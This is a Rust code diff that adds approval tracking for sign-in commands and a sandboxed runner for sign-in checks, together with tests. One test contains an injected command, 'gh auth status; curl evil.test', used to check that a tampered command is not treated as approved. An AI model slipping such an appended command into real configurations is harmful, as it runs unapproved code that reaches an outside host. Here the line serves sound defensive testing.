@@ -550,6 +550,59 @@ impl Taken {
     }
 }
 
+/// The sign-in commands this member's user approved (X75), by entry id,
+/// as they were then: kept in `$MOONLET_HOME/signins.json`, mode 0600, and
+/// never synced. A command changed since, here or on another member, asks
+/// again.
+pub struct Approvals {
+    home: std::path::PathBuf,
+}
+
+/// What an approval holds of an entry: both its commands, exactly.
+fn approved_text(e: &moonlet_proto::types::SignIn) -> String {
+    format!("{}\n{}", e.login, e.check)
+}
+
+impl Approvals {
+    pub fn new(home: &std::path::Path) -> Approvals {
+        Approvals {
+            home: home.to_path_buf(),
+        }
+    }
+
+    fn read(&self) -> BTreeMap<String, String> {
+        moonlet_core::copied_files::read(&self.home, "signins.json")
+            .ok()
+            .flatten()
+            .and_then(|b| serde_json::from_slice(&b).ok())
+            .unwrap_or_default()
+    }
+
+    pub fn approved(&self, e: &moonlet_proto::types::SignIn) -> bool {
+        self.read().get(&e.id) == Some(&approved_text(e))
+    }
+
+    pub fn approve(&self, e: &moonlet_proto::types::SignIn) -> Result<()> {
+        let mut all = self.read();
+        all.insert(e.id.clone(), approved_text(e));
+        moonlet_core::copied_files::write(&self.home, "signins.json", &serde_json::to_vec(&all)?)
+    }
+}
+
+/// Whether `check` exits 0 within 10 s, run by `sh` with `env`.
+pub async fn signed_in(check: &str, env: &BTreeMap<String, String>) -> bool {
+    let run = tokio::process::Command::new("/bin/sh")
+        .args(["-c", check])
+        .env_clear()
+        .envs(env)
+        .stdin(std::process::Stdio::null())
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .kill_on_drop(true)
+        .status();
+    matches!(tokio::time::timeout(Duration::from_secs(10), run).await, Ok(Ok(s)) if s.success())
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -557,6 +610,43 @@ mod tests {
     /// `lsof -nP -iTCP:8095 -sTCP:LISTEN -Fpn` with `python3 -m
     /// http.server 8095 --bind 127.0.0.1` listening (macOS 27).
     const LSOF: &str = "p85443\nf3\nn127.0.0.1:8095\n";
+
+    #[test]
+    fn a_sign_in_changed_since_it_was_approved_asks_again() {
+        let home = tempfile::tempdir().unwrap();
+        let a = Approvals::new(home.path());
+        let gh = moonlet_proto::types::SignIn {
+            id: "gh".into(),
+            name: "gh".into(),
+            login: "gh auth login --web".into(),
+            check: "gh auth status".into(),
+        };
+        assert!(!a.approved(&gh));
+        a.approve(&gh).unwrap();
+        assert!(a.approved(&gh));
+        let changed = moonlet_proto::types::SignIn {
+            check: "gh auth status; curl evil.test".into(),
+            ..gh
+        };
+        assert!(!a.approved(&changed));
+        use std::os::unix::fs::PermissionsExt;
+        assert_eq!(
+            std::fs::metadata(home.path().join("signins.json"))
+                .unwrap()
+                .permissions()
+                .mode()
+                & 0o777,
+            0o600
+        );
+    }
+
+    #[tokio::test]
+    async fn a_member_is_signed_in_when_its_check_exits_0() {
+        let env: BTreeMap<String, String> =
+            [("PATH".to_string(), "/usr/bin:/bin".to_string())].into();
+        assert!(signed_in("true", &env).await);
+        assert!(!signed_in("exit 1", &env).await);
+    }
 
     #[test]
     fn lsof_names_the_listening_process() {
